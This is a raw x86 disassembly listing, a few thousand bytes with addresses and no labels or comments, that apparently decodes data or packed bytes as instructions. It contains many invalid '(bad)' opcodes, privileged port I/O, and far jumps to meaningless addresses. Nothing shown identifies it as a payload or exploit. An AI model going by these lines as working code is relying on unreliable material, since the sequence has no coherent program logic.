  4240f6:	gs rcl ebx,1
  4240f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4240fa:	xor    al,0x1c
  4240fc:	ds call 0xc291ea11
  424102:	fimul  DWORD PTR [eax-0x5407803f]
  424108:	or     ecx,esp
  42410a:	xchg   DWORD PTR [ecx+0x25],ebx
  42410d:	jle    0x424148
  42410f:	add    ecx,DWORD PTR [esi]
  424111:	and    BYTE PTR [edi+0x79],cl
  424114:	into   
  424115:	cdq    
  424116:	arpl   WORD PTR [edi-0x9],ax
  424119:	rcr    BYTE PTR [edx+0x3e],1
  42411c:	mov    al,ds:0x18ca4de
  424121:	inc    esp
  424122:	loope  0x42416d
  424124:	dec    esi
  424125:	shr    DWORD PTR [edi],1
  424127:	iret   
  424128:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424129:	cmp    al,0x81
  42412b:	or     ah,BYTE PTR [edx]
  42412d:	fmul   QWORD PTR [ebx+0x7]
  424130:	add    BYTE PTR [eax+0x44],0xcd
  424134:	xor    DWORD PTR [esi-0x59],0xffffff9b
  424138:	and    BYTE PTR [eax-0xa4918b],dh
  42413e:	fistp  WORD PTR [ebp+ecx*8+0x3e]
  424142:	mov    bl,0x9f
  424144:	dec    eax
  424145:	xor    ah,BYTE PTR [edx+0x15]
  424148:	test   eax,0xe800e8ca
  42414d:	xchg   BYTE PTR [ecx],ah
  42414f:	xchg   ebx,eax
  424150:	test   DWORD PTR [ecx],edx
  424152:	outs   dx,BYTE PTR ds:[esi]
  424153:	ss pop esi
  424155:	push   esp
  424156:	je     0x4240e3
  424158:	sub    ebp,DWORD PTR [edx+edx*8-0x4d832016]
  42415f:	fs push edx
  424161:	arpl   WORD PTR [edi-0xd],bx
  424164:	sub    BYTE PTR ds:0x703dea45,ch
  42416a:	mov    edx,0x53b9b532
  42416f:	xor    al,0x84
  424171:	inc    eax
  424172:	mov    ah,0x43
  424174:	pop    ecx
  424175:	and    DWORD PTR [esi],ebx
  424177:	imul   esp,DWORD PTR [edi+edx*4],0xe9c45c74
  42417e:	test   dl,dl
  424180:	shr    BYTE PTR [eax-0x73],0xa9
  424184:	sbb    ebx,esp
  424186:	add    ecx,DWORD PTR [edi]
  424188:	mov    cl,0x67
  42418a:	inc    esi
  42418b:	mov    bl,0x7f
  42418d:	sub    BYTE PTR [ebx],0x23
  424190:	mov    bh,0x70
  424192:	and    al,0xf4
  424194:	pop    ebx
  424195:	icebp  
  424196:	jnp    0x4241ce
  424198:	cld    
  424199:	adc    bl,bh
  42419b:	push   0xffffff94
  42419d:	lods   al,BYTE PTR ds:[esi]
  42419e:	pop    eax
  42419f:	repnz pop ecx
  4241a1:	mov    ds:0x3e42a1be,al
  4241a6:	sub    eax,edx
  4241a8:	arpl   WORD PTR [ebx],bx
  4241aa:	pop    es
  4241ab:	into   
  4241ac:	repnz sub dh,BYTE PTR [eax-0x67b95822]
  4241b3:	lock jmp 0xd553:0xd1c0d7da
  4241bb:	jg     0x42417d
  4241bd:	leave  
  4241be:	jnp    0x4241f6
  4241c0:	jmp    0x4241e6
  4241c2:	jp     0x4241f2
  4241c4:	adc    al,0x26
  4241c6:	hlt    
  4241c7:	xchg   edx,eax
  4241c8:	scas   eax,DWORD PTR es:[edi]
  4241c9:	(bad)
  4241cc:	retf   
  4241cd:	jnp    0x4241a2
  4241cf:	inc    edi
  4241d0:	mov    ch,0x5b
  4241d2:	rcr    BYTE PTR [eax-0x56b95027],cl
  4241d8:	cmp    DWORD PTR [ecx+0xb],eax
  4241db:	ds or  al,0xd7
  4241de:	imul   edx,ecx,0xe2ddc648
  4241e4:	shl    esp,cl
  4241e6:	sbb    eax,0x18aa3b1d
  4241eb:	neg    BYTE PTR [ecx+0x43]
  4241ee:	scas   eax,DWORD PTR es:[edi]
  4241ef:	lock jecxz 0x4241b6
  4241f2:	mov    al,0x4c
  4241f4:	dec    ebp
  4241f5:	pusha  
  4241f6:	push   ecx
  4241f7:	ffreep st(2)
  4241f9:	jbe    0x4241a7
  4241fb:	retf   0x6191
  4241fe:	sub    eax,0x1b1f4559
  424203:	jl     0x424283
  424205:	pusha  
  424206:	sbb    al,0xa3
  424208:	scas   al,BYTE PTR es:[edi]
  424209:	outs   dx,DWORD PTR ds:[esi]
  42420a:	push   edi
  42420b:	jge    0x424273
  42420d:	pop    ebx
  42420e:	js     0x4241c0
  424210:	ins    BYTE PTR es:[edi],dx
  424211:	cdq    
  424212:	add    eax,0x81a688cb
  424217:	ffree  st(3)
  424219:	test   BYTE PTR ds:0x6da457d9,dl
  42421f:	ds aam 0xd4
  424222:	adc    esi,edx
  424224:	not    edi
  424226:	mov    ecx,0x9e2d3c8e
  42422b:	xor    eax,0x3927ceb
  424230:	stos   DWORD PTR es:[edi],eax
  424231:	jmp    0x424229
  424233:	js     0x424252
  424235:	sahf   
  424236:	sub    dl,dl
  424238:	mov    edx,0x7f8fdc88
  42423d:	or     BYTE PTR [ebx-0x77],0x83
  424241:	mov    ch,0x21
  424243:	sbb    esi,DWORD PTR [eax]
  424245:	popa   
  424246:	push   0x73
  424248:	sbb    esp,eax
  42424a:	and    ah,dh
  42424c:	les    esp,FWORD PTR [edx]
  42424e:	and    eax,DWORD PTR [ebp+edi*4-0x68982872]
  424255:	inc    ebx
  424256:	xor    bl,ch
  424258:	adc    BYTE PTR [edx-0x3e74bb78],ah
  42425e:	(bad)  
  42425f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424260:	inc    eax
  424261:	jbe    0x424223
  424263:	fs fs cwde 
  424266:	pop    es
  424267:	or     ch,bh
  424269:	js     0x42427c
  42426b:	std    
  42426c:	dec    ebx
  42426d:	adc    ebx,esi
  42426f:	sbb    eax,0xb5b40665
  424274:	out    0x39,al
  424276:	mov    esi,0x70aab6c0
  42427b:	and    al,cl
  42427d:	sbb    eax,0x72
  424280:	mov    esi,0x86713be7
  424285:	lea    esi,[edx-0x32f281f1]
  42428b:	loop   0x424228
  42428d:	xchg   ebx,esi
  42428f:	jno    0x424228
  424291:	and    BYTE PTR [edi+0x73],bh
  424294:	cwde   
  424295:	es sub eax,0x9f58872f
  42429b:	and    eax,esi
  42429d:	arpl   si,bp
  42429f:	push   ss
  4242a0:	dec    ebx
  4242a1:	stos   DWORD PTR es:[edi],eax
  4242a2:	jecxz  0x4242d2
  4242a4:	push   ss
  4242a5:	adc    BYTE PTR [edx+0x22],bl
  4242a8:	daa    
  4242a9:	rcr    DWORD PTR [ecx],cl
  4242ab:	jle    0x424251
  4242ad:	sub    al,0x5a
  4242af:	loope  0x42429d
  4242b1:	mov    eax,ds:0x86a6e387
  4242b6:	sub    bh,cl
  4242b8:	inc    esp
  4242b9:	call   0x85ad5820
  4242be:	jns    0x4242bf
  4242c0:	xchg   edx,eax
  4242c1:	sbb    bl,BYTE PTR [edi+0x33]
  4242c4:	fsubp  st(7),st
  4242c6:	(bad)  
  4242c7:	or     edx,DWORD PTR [ebx-0x60]
  4242ca:	imul   ebx,DWORD PTR [ecx],0xffffffbb
  4242cd:	dec    ebx
  4242ce:	adc    edx,esp
  4242d0:	fld    QWORD PTR [eax]
  4242d2:	les    edi,FWORD PTR [ebp-0x2f]
  4242d5:	out    dx,eax
  4242d6:	cld    
  4242d7:	not    BYTE PTR [ebx-0x470cfa73]
  4242dd:	(bad)  
  4242de:	retf   0xcf06
  4242e1:	lahf   
  4242e2:	fwait
  4242e3:	inc    ebp
  4242e4:	mov    ds:0xce916c61,eax
  4242e9:	mov    eax,0xcf018411
  4242ee:	xor    BYTE PTR [eax-0x11],dl
  4242f1:	mov    ch,0x2b
  4242f3:	rcr    BYTE PTR [eax+ecx*4+0x48baeb1a],1
  4242fa:	cmc    
  4242fb:	or     eax,0xadeab194
  424300:	inc    ebx
  424301:	mov    al,0x8e
  424303:	retf   0xbb62
  424306:	xor    esi,DWORD PTR [ebp+0x62]
  424309:	scas   al,BYTE PTR es:[edi]
  42430a:	jecxz  0x42436e
  42430c:	je     0x424318
  42430e:	xchg   ebx,eax
  42430f:	stos   DWORD PTR es:[edi],eax
  424310:	adc    bl,BYTE PTR [ebp+0x15f2dbea]
  424316:	test   DWORD PTR [esi+0x60],edi
  424319:	(bad)
  42431c:	into   
  42431d:	pop    ebp
  42431e:	add    ch,BYTE PTR [ecx]
  424320:	mov    bh,0x9b
  424322:	pop    eax
  424323:	outs   dx,DWORD PTR ds:[esi]
  424324:	js     0x42436d
  424326:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424327:	hlt    
  424328:	mov    ds:0x5ea5290e,eax
  42432d:	cmp    BYTE PTR [edi+edx*1],cl
  424330:	dec    ebx
  424331:	mov    ecx,0x968dff25
  424336:	outs   dx,BYTE PTR ds:[si]
  424338:	sti    
  424339:	ret    
  42433a:	ret    0x2c44
  42433d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42433e:	shr    DWORD PTR [edx],1
  424340:	cs int 0x33
  424343:	xchg   esi,eax
  424344:	aaa    
  424345:	sub    eax,DWORD PTR [ecx-0x29]
  424348:	mov    esp,0x5c1a6539
  42434d:	add    edx,DWORD PTR [edx]
  42434f:	jp     0x424392
  424351:	mov    esi,0xb460b65a
  424356:	adc    al,0x68
  424358:	mov    ebx,0x38445842
  42435d:	jae    0x424372
  42435f:	fs and edi,esi
  424362:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424363:	mov    dh,0xe2
  424365:	inc    eax
  424366:	dec    esi
  424367:	jge    0x424320
  424369:	xchg   edi,eax
  42436a:	outs   dx,BYTE PTR ds:[esi]
  42436b:	dec    edx
  42436c:	push   ecx
  42436d:	daa    
  42436e:	xchg   DWORD PTR [eax+0x58],esp
  424371:	sub    BYTE PTR [eax],cl
  424373:	stos   DWORD PTR es:[edi],eax
  424374:	cmc    
  424375:	cmp    BYTE PTR [esi-0x637e195b],ah
  42437b:	fisttp DWORD PTR [esi+0x1bb1f996]
  424381:	shl    BYTE PTR [ebx-0x30],cl
  424384:	stos   BYTE PTR es:[edi],al
  424385:	mov    ds:0xa3e181ee,al
  42438a:	pop    ebx
  42438b:	pushf  
  42438c:	push   0x4b954ee2
  424391:	idiv   DWORD PTR ds:0xed126bc7
  424397:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424398:	pop    ebp
  424399:	bound  edi,QWORD PTR [edx+0x3e5aa3b4]
  42439f:	sbb    al,0x33
  4243a1:	xor    BYTE PTR [ebx-0x24],al
  4243a4:	pusha  
  4243a5:	lock nop
  4243a7:	mov    ah,0xb1
  4243a9:	adc    al,0x55
  4243ab:	mov    eax,0x844ca8b0
  4243b0:	jns    0x4243de
  4243b2:	xchg   esp,eax
  4243b3:	sub    BYTE PTR [eax-0x9d9339f],al
  4243b9:	ds loop 0x4243c9
  4243bc:	add    ebp,ebx
  4243be:	hlt    
  4243bf:	lds    ecx,FWORD PTR ds:0x17740a
  4243c5:	add    BYTE PTR [eax],al
  4243c7:	add    BYTE PTR [eax],al
  4243c9:	add    BYTE PTR [edx+0x44],bl
  4243cc:	dec    esi
  4243cd:	inc    ecx
  4243ce:	pop    esi
  4243cf:	dec    ebx
  4243d0:	pop    edi
  4243d1:	pop    edi
  4243d2:	inc    edx
  4243d3:	cwde   
  4243d4:	inc    esi
  4243d5:	loop   0x4243a5
  4243d7:	mov    esi,0xd1ea5037
  4243dc:	add    DWORD PTR [eax],eax
  4243de:	add    BYTE PTR [esi],0x0
  4243e1:	add    BYTE PTR [eax+0x14],dl
  4243e4:	pop    edx
  4243e5:	(bad)  
  4243e6:	xor    DWORD PTR [ebx-0x59],ebp
  4243e9:	jmp    0x4243c9
  4243eb:	faddp  st(7),st
  4243ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4243ee:	call   0x58d:0x8b296a13
  4243f5:	retf   0x1dfc
  4243f8:	cmp    al,0x23
  4243fa:	xchg   BYTE PTR [edi],bl
  4243fc:	or     ebx,esi
  4243fe:	pop    edi
  4243ff:	jmp    0x42445f
  424401:	outs   dx,BYTE PTR ds:[esi]
  424402:	lock xchg edx,eax
  424404:	lods   eax,DWORD PTR ds:[esi]
  424405:	cmp    BYTE PTR [eax+0x6f08b705],0x4f
  42440c:	mov    dh,0x42
  42440e:	add    cl,BYTE PTR ds:0x8744ced5
  424414:	int3   
  424415:	sbb    ebx,DWORD PTR [eax+ebp*1]
  424418:	aam    0x4c
  42441a:	aas    
  42441b:	or     al,0x97
  42441d:	fistp  DWORD PTR [bp+di-0x7]
  424421:	fs mov ecx,0xaa27e858
  424427:	test   DWORD PTR [ecx],ebp
  424429:	add    edi,DWORD PTR [edx]
  42442b:	mov    eax,DWORD PTR [ebx+0x32]
  42442e:	mov    dl,0xf0
  424430:	fs pop ebp
  424432:	pusha  
  424433:	idiv   esi
  424435:	push   0x7380859b
  42443a:	adc    DWORD PTR [edi+0x576f8504],edx
  424440:	add    BYTE PTR [eax+0x11a86303],cl
  424446:	in     eax,dx
  424447:	sbb    DWORD PTR [ecx-0x53408b5c],ebx
  42444d:	(bad)  
  42444e:	mov    ds:0xa9835261,eax
  424453:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424454:	mov    es:0x71c24e39,eax
  42445a:	jmp    0xae4f:0x9ec279c
  424461:	sub    edx,DWORD PTR [edx+eax*1-0x3e8cb7fb]
  424468:	les    eax,FWORD PTR [esi]
  42446a:	jecxz  0x424494
  42446c:	add    edx,DWORD PTR [edx-0x73ca02e5]
  424472:	jbe    0x4244ab
  424474:	(bad)  
  424476:	hlt    
  424477:	adc    bh,ch
  424479:	arpl   WORD PTR [ecx-0xf],ax
  42447c:	ret    
  42447d:	push   ebp
  42447e:	add    al,0x1f
  424480:	in     eax,dx
  424481:	push   0xb056a687
  424486:	push   ecx
  424487:	ss jae 0x42440a
  42448a:	inc    ebx
  42448b:	jg     0x42441f
  42448d:	mov    BYTE PTR [ebx],cl
  42448f:	jnp    0x424447
  424491:	fnstsw ax
  424493:	xlat   BYTE PTR ds:[ebx]
  424494:	pop    eax
  424495:	pop    es
  424496:	inc    edx
  424497:	push   eax
  424498:	dec    ecx
  424499:	or     dh,ah
  42449b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42449c:	cmp    ah,ch
  42449e:	mov    ds:0x15537514,eax
  4244a3:	mov    ebx,0x16ba4c1a
  4244a8:	cwde   
  4244a9:	ja     0x4244ca
  4244ab:	pop    esi
  4244ac:	ins    DWORD PTR es:[edi],dx
  4244ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4244ae:	mov    BYTE PTR [ecx+0x4b],ch
  4244b1:	ins    DWORD PTR es:[edi],dx
  4244b2:	shr    BYTE PTR [edi+0x2fbf2d8d],cl
  4244b8:	lock dec ebx
  4244bb:	aad    0x3c
  4244bd:	out    dx,al
  4244be:	mov    dh,0x8f
  4244c0:	icebp  
  4244c1:	jge    0x424449
  4244c3:	adc    DWORD PTR [eax-0x4b],0x29f8394c
  4244ca:	jge    0x4244f7
  4244cc:	je     0x4244dc
  4244ce:	out    0x1,al
  4244d0:	dec    ebp
  4244d1:	ss sti 
  4244d3:	push   cs
  4244d4:	xchg   esi,eax
  4244d5:	and    eax,esp
  4244d7:	and    BYTE PTR [eax],0xa8
  4244da:	retf   
  4244db:	in     eax,0xbc
  4244dd:	retf   0x1f56
  4244e0:	cwde   
  4244e1:	cmp    eax,DWORD PTR [ebp+0x6]
  4244e4:	dec    esi
  4244e5:	sub    edx,DWORD PTR [eax+0x4fd1d9d0]
  4244eb:	cld    
  4244ec:	and    ebx,esi
  4244ee:	not    BYTE PTR [edi-0x76]
  4244f1:	rcl    ebx,1
  4244f3:	call   0xdf9f:0xedfc5d21
  4244fa:	sub    edi,DWORD PTR [esi]
  4244fc:	(bad)  
  4244fe:	mov    ecx,0xd96e08ce
  424503:	add    al,0x4e
  424505:	mov    esp,0xdcc7f7ab
  42450a:	mov    bl,0xcc
  42450c:	shl    ecx,0x2f
  42450f:	shl    DWORD PTR [edi+0x795f18cf],0x3d
  424516:	jb     0x424560
  424518:	sub    BYTE PTR [esi+0x8],bl
  42451b:	xlat   BYTE PTR ds:[ebx]
  42451c:	sub    DWORD PTR ds:0x3bbe2868,0xf5507575
  424526:	or     dh,BYTE PTR [bx+di]
  424529:	not    ah
  42452b:	mov    WORD PTR ds:0x937a,gs
  424530:	icebp  
  424531:	popa   
  424532:	sbb    ebx,ebx
  424534:	in     al,0x71
  424536:	push   cs
  424537:	and    DWORD PTR [edi+0x65],0xf9ff1620
  42453e:	mov    ch,0x83
  424540:	call   0x9994:0xf35d2035
  424547:	push   0xd157d085
  42454c:	cmp    al,0x8b
  42454e:	mov    WORD PTR [esi+0x4b6ae42f],?
  424554:	enter  0x81c7,0xc7
  424558:	in     al,dx
  424559:	sub    eax,0xe01332c3
  42455e:	push   ecx
  42455f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424560:	sub    DWORD PTR [esi-0x4],ebp
  424563:	mov    ecx,0x82754e40
  424568:	sub    eax,0xfa9bd28b
  42456d:	jecxz  0x4245d9
  42456f:	jmp    0xeb5ba285
  424574:	mov    edi,0xb9e0eb7e
  424579:	sub    al,0xa1
  42457b:	inc    ebx
  42457c:	adc    eax,0x4ef70bff
  424581:	cdq    
  424582:	test   eax,0x61c3d487
  424587:	push   es
  424588:	xlat   BYTE PTR ds:[ebx]
  424589:	add    BYTE PTR [ecx-0x6b],al
  42458c:	ins    BYTE PTR es:[edi],dx
  42458d:	out    0x65,al
  42458f:	adc    ebx,DWORD PTR ds:0x88d06622
  424595:	xor    ah,cl
  424597:	push   cs
  424598:	lods   al,BYTE PTR ds:[esi]
  424599:	cmp    ch,BYTE PTR [ebx+0x13256e9d]
  42459f:	imul   eax,DWORD PTR [edx-0x1c9e4181],0x6778698b
  4245a9:	or     DWORD PTR [ebp+0x51e56768],eax
  4245af:	dec    ebp
  4245b0:	into   
  4245b1:	sub    eax,DWORD PTR [ecx-0xd]
  4245b4:	jl     0x42453e
  4245b6:	xor    cl,dh
  4245b8:	int3   
  4245b9:	jnp    0x4245e5
  4245bb:	pushf  
  4245bc:	or     DWORD PTR [edx],esp
  4245be:	leave  
  4245bf:	(bad)  
  4245c0:	sti    
  4245c1:	or     esi,DWORD PTR [esi+0x7f]
  4245c4:	es jl  0x42462a
  4245c7:	scas   al,BYTE PTR es:[edi]
  4245c8:	call   0x16d48f19
  4245cd:	call   0x36c0:0xfc804723
  4245d4:	xchg   esi,eax
  4245d5:	fwait
  4245d6:	mov    es,WORD PTR [ebp-0x46bcdfff]
  4245dc:	sbb    DWORD PTR [ebx+eiz*4],esp
  4245df:	(bad)  
  4245e0:	mov    esi,0xac6a3b1e
  4245e5:	push   0x5e4c16fb
  4245ea:	xchg   eax,edx
  4245ec:	cdq    
  4245ed:	and    eax,DWORD PTR [ebx-0x290fd268]
  4245f3:	jp     0x424673
  4245f5:	pop    ecx
  4245f6:	add    ebp,DWORD PTR [ebp-0x635b4177]
  4245fc:	pop    esi
  4245fd:	icebp  
  4245fe:	inc    edx
  4245ff:	cmp    dl,dl
  424601:	out    0x9a,eax
  424603:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424604:	mov    edx,0x4cce4461
  424609:	mov    bh,0xb3
  42460b:	cmp    al,0x9b
  42460d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42460e:	pop    ss
  42460f:	xor    eax,0xb2e9f420
  424614:	mov    bh,0x68
  424616:	out    dx,eax
  424617:	call   0x2af4:0x5c6f07eb
  42461e:	jae    0x424688
  424620:	loopne 0x42463a
  424622:	ss out 0x9f,al
  424625:	xchg   esi,eax
  424626:	ds jl  0x42462e
  424629:	jno    0x4245af
  42462b:	xchg   ebx,eax
  42462c:	fadd   QWORD PTR [ebp-0x20]
  42462f:	pop    esp
  424630:	xchg   edi,eax
  424631:	add    dl,cl
  424633:	mul    BYTE PTR [eax]
  424635:	and    esp,DWORD PTR [eax]
  424637:	fcomp  DWORD PTR [ebp-0x65]
  42463a:	imul   esi,DWORD PTR [ebp+0x74],0xffffffde
  42463e:	add    eax,0x712f7658
  424643:	add    ebx,0x35
  424646:	push   edi
  424647:	movd   ecx,mm2
  42464a:	push   eax
  42464b:	data16 fistp DWORD PTR [edx+0xe1085b5]
  424652:	push   es
  424653:	sar    ch,1
  424655:	mov    eax,0x56034b49
  42465a:	loope  0x424669
  42465c:	fwait
  42465d:	mov    ds:0xd0c79ec1,eax
  424662:	sbb    ah,ch
  424664:	inc    ebx
  424665:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424666:	xchg   ecx,eax
  424667:	pop    esi
  424668:	mov    bl,0xe1
  42466a:	or     al,0x59
  42466c:	ss inc ebx
  42466e:	dec    edi
  42466f:	inc    ebp
  424670:	jecxz  0x42461e
  424672:	mov    edi,0x12825b6d
  424677:	cmp    eax,0xdd8e684e
  42467c:	sar    ebp,0x1b
  42467f:	sti    
  424680:	fnstenv [esp+esi*8+0x49]
  424684:	retf   0xaeb
  424687:	mov    esp,eax
  424689:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42468a:	pop    ss
  42468b:	mov    esi,0x9c10bc26
  424690:	pop    ebx
  424691:	ror    DWORD PTR [ebx],0x33
  424694:	jmp    FWORD PTR [ebx-0x80]
  424697:	or     esp,ebp
  424699:	scas   eax,DWORD PTR es:[edi]
  42469a:	popa   
  42469b:	pop    edx
  42469c:	lods   eax,DWORD PTR cs:[esi]
  42469e:	inc    ebx
  42469f:	cli    
  4246a0:	sub    dl,BYTE PTR [eax-0x7115a04b]
  4246a6:	xchg   esp,eax
  4246a7:	fwait
  4246a8:	and    dl,BYTE PTR [eax]
  4246aa:	mov    ch,BYTE PTR [ebx-0x4c]
  4246ad:	lea    ebp,[ebp-0x56]
  4246b0:	sbb    eax,0x1843c3c5
  4246b5:	jge    0x424682
  4246b7:	jne    0x424710
  4246b9:	dec    esi
  4246ba:	sbb    BYTE PTR [edx+ecx*4],cl
  4246bd:	sub    al,0x66
  4246bf:	mov    ebp,?
  4246c1:	mov    ah,0x99
  4246c3:	pop    ebx
  4246c4:	sbb    DWORD PTR [ebp+0x46],edx
  4246c7:	mov    ds:0xd23c9b0e,eax
  4246cc:	inc    esi
  4246cd:	rcr    DWORD PTR [eax+esi*1+0x76],1
  4246d1:	mov    ebx,0xa9e0e928
  4246d6:	cwde   
  4246d7:	xor    BYTE PTR [esi],ah
  4246d9:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4246db:	addr16 ret 0x6143
  4246df:	xor    eax,0xe5137246
  4246e4:	and    DWORD PTR [edi+0x668d1bba],eax
  4246ea:	out    dx,eax
  4246eb:	lds    edx,FWORD PTR ds:0x98077a97
  4246f1:	fcomp  DWORD PTR es:[ebx-0x70]
  4246f5:	adc    al,0x59
  4246f7:	sbb    ah,bh
  4246f9:	dec    esi
  4246fa:	jl     0x4246b5
  4246fc:	add    DWORD PTR [esi-0x1c41390],ecx
  424702:	mov    ah,bh
  424704:	add    eax,0xcb784e06
  424709:	mov    ch,bl
  42470b:	xchg   ecx,eax
  42470c:	div    DWORD PTR [edi-0xb]
  42470f:	bound  ebx,QWORD PTR [edi+0x39]
  424712:	in     al,0x7b
  424714:	inc    edx
  424715:	jne    0x4246a9
  424717:	bound  esp,QWORD PTR [eax+0x29]
  42471a:	add    eax,0xf94f29f7
  42471f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424720:	adc    ah,dh
  424722:	adc    al,0x2e
  424724:	sub    DWORD PTR [ecx+0x25],edx
  424727:	jmp    0x1445:0x6ac07047
  42472e:	and    ebx,DWORD PTR [eax]
  424730:	xor    al,ch
  424732:	add    al,BYTE PTR [eax-0x7e]
  424735:	jle    0x424707
  424737:	mov    bl,0x5
  42473a:	ficomp DWORD PTR [ecx+0x65]
  42473d:	push   esi
  42473e:	dec    ecx
  42473f:	rcr    BYTE PTR [esi],1
  424741:	ja     0x4246f2
  424743:	repz test al,0x89
  424746:	loopne 0x424782
  424748:	imul   bx,WORD PTR [ebx],0x81ea
  42474d:	add    ebp,0xffffffdb
  424750:	std    
  424751:	jbe    0x424726
  424753:	(bad)  [ebp-0x1d795ddb]
  424759:	(bad)  
  42475a:	mov    WORD PTR [esi-0x17],fs
  42475d:	inc    edi
  42475e:	push   esi
  42475f:	mov    edi,0x5d9c93bf
  424764:	mov    ds:0x1f149e2e,al
  424769:	fwait
  42476a:	dec    ebx
  42476b:	fld    DWORD PTR ds:0x6fa88526
  424771:	add    BYTE PTR [ebx+0x67],bh
  424774:	fs int3 
  424776:	mov    dh,BYTE PTR [edx]
  424778:	repnz pop esp
  42477a:	js     0x4247eb
  42477c:	xchg   ebx,eax
  42477d:	mov    esp,0xa9b83283
  424782:	adc    eax,0xc20e5ba0
  424787:	push   esi
  424788:	(bad)  
  424789:	cs enter 0x64ea,0x15
  42478e:	add    al,0xce
  424790:	push   ebp
  424791:	mov    ds:0xf15c7870,eax
  424796:	and    eax,0x4b1dd918
  42479b:	and    ebx,DWORD PTR [edi]
  42479d:	fcmovnu st,st(7)
  42479f:	clc    
  4247a0:	adc    bh,cl
  4247a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4247a3:	ret    0x60cf
  4247a6:	test   BYTE PTR [edx+0x5],ch
  4247a9:	add    eax,0x62e23c9a
  4247ae:	outs   dx,DWORD PTR ds:[esi]
  4247af:	cmc    
  4247b0:	inc    ecx
  4247b1:	bound  edx,QWORD PTR [ebp-0x111c96df]
  4247b7:	(bad)  
  4247b8:	cmp    al,0x4e
  4247ba:	inc    edi
  4247bb:	xchg   ebp,eax
  4247bc:	mov    ebp,0x4e1fb84c
  4247c1:	stos   BYTE PTR es:[edi],al
  4247c2:	push   es
  4247c3:	rcr    bl,1
  4247c5:	mov    ds:0x4e6b5555,al
  4247ca:	rcr    cl,cl
  4247cc:	push   esp
  4247cd:	pop    ebx
  4247ce:	fcomp  QWORD PTR [ebx-0x2616e47b]
  4247d4:	adc    bl,BYTE PTR [esp+eiz*2+0x53]
  4247d8:	and    DWORD PTR ds:0xbbda8486,edx
  4247de:	jo     0x424822
  4247e0:	xor    al,0xb1
  4247e2:	les    edx,FWORD PTR [ecx+eax*1-0x44d19ad7]
  4247e9:	inc    esi
  4247ea:	mov    esp,0xc279ade9
  4247f0:	mov    ebp,0x73aba31f
  4247f5:	addr16 loopne 0x4247d1
  4247f8:	ret    0xb38b
  4247fb:	fisttp QWORD PTR [esi-0x680362cb]
  424801:	push   edi
  424802:	rol    ch,1
  424804:	jg     0x4247e3
  424806:	call   0x3e12:0xae88bf47
  42480d:	rcr    BYTE PTR [edi-0x14],cl
  424810:	sub    ebx,DWORD PTR ds:0x15816394
  424816:	dec    ebx
  424817:	stc    
  424818:	pop    edi
  424819:	push   esi
  42481a:	sbb    DWORD PTR [ecx+0x105892d3],0x12
  424821:	lods   al,BYTE PTR ds:[esi]
  424822:	dec    edx
  424823:	jae    0x424887
  424825:	cmp    bh,BYTE PTR [edi+0x35c69bdc]
  42482b:	add    BYTE PTR [ebx+0xcab4789],dl
  424831:	retf   
  424832:	sti    
  424833:	aas    
  424834:	ftst   
  424836:	test   al,0xab
  424838:	sbb    al,0xc6
  42483a:	hlt    
  42483b:	aad    0xbe
  42483d:	stc    
  42483e:	adc    al,0x51
  424840:	dec    eax
  424841:	clc    
  424842:	sbb    ebx,DWORD PTR [esi+0x3daf54da]
  424848:	lods   eax,DWORD PTR ds:[esi]
  424849:	adc    eax,0x91a8dcdd
  42484e:	(bad)  
  42484f:	jmp    0x424804
  424851:	scas   eax,DWORD PTR es:[edi]
  424852:	dec    ebp
  424853:	mov    dh,0x57
  424855:	(bad)
  424859:	stos   BYTE PTR es:[edi],al
  42485a:	mov    eax,ds:0xafc36bb4
  42485f:	sub    ebp,DWORD PTR [ebp+0x7d]
  424862:	popa   
  424863:	push   ds
  424864:	jp     0x4247eb
  424866:	adc    dh,BYTE PTR [ecx-0x20]
  424869:	pusha  
  42486a:	push   edi
  42486b:	or     al,0x3e
  42486d:	xlat   BYTE PTR ds:[ebx]
  42486e:	jg     0x42481a
  424870:	js     0x424830
  424872:	pop    eax
  424873:	or     DWORD PTR [esi-0x4a],ebx
  424876:	jp     0x4248dd
  424878:	arpl   bp,bx
  42487a:	cdq    
  42487b:	sub    bh,BYTE PTR [ecx]
  42487d:	jbe    0x4248cf
  42487f:	out    0x8e,eax
  424881:	gs aam 0x97
  424884:	inc    ecx
  424885:	add    BYTE PTR [ebx-0x1f3aa86c],bh
  42488b:	dec    ecx
  42488c:	mov    bh,0x7f
  42488e:	dec    edx
  42488f:	mov    ds:0xb277c910,eax
  424894:	push   edi
  424895:	ss out 0x8f,al
  424898:	ror    DWORD PTR [esi-0x29fe4c5a],cl
  42489e:	and    ch,BYTE PTR [ecx]
  4248a0:	xchg   ebx,eax
  4248a1:	in     al,0x5d
  4248a3:	mov    ch,bh
  4248a5:	or     ecx,0xaf79164d
  4248ab:	ss push esi
  4248ad:	or     eax,0xfd1f63e8
  4248b2:	sub    al,0xaa
  4248b4:	pop    edi
  4248b5:	fwait
  4248b6:	pop    edi
  4248b7:	inc    edx
  4248b8:	pop    ds
  4248b9:	(bad)  
  4248ba:	fwait
  4248bb:	push   ebp
  4248bc:	loopne 0x4248d6
  4248be:	push   esp
  4248bf:	adc    BYTE PTR [ebx+ebx*1-0x24],0xc3
  4248c4:	loope  0x424935
  4248c6:	imul   ebp,DWORD PTR [ebx+0x6b],0xffffffce
  4248ca:	and    BYTE PTR ds:0x3a5ddc24,dh
  4248d0:	ror    DWORD PTR [edx-0x38],0x8d
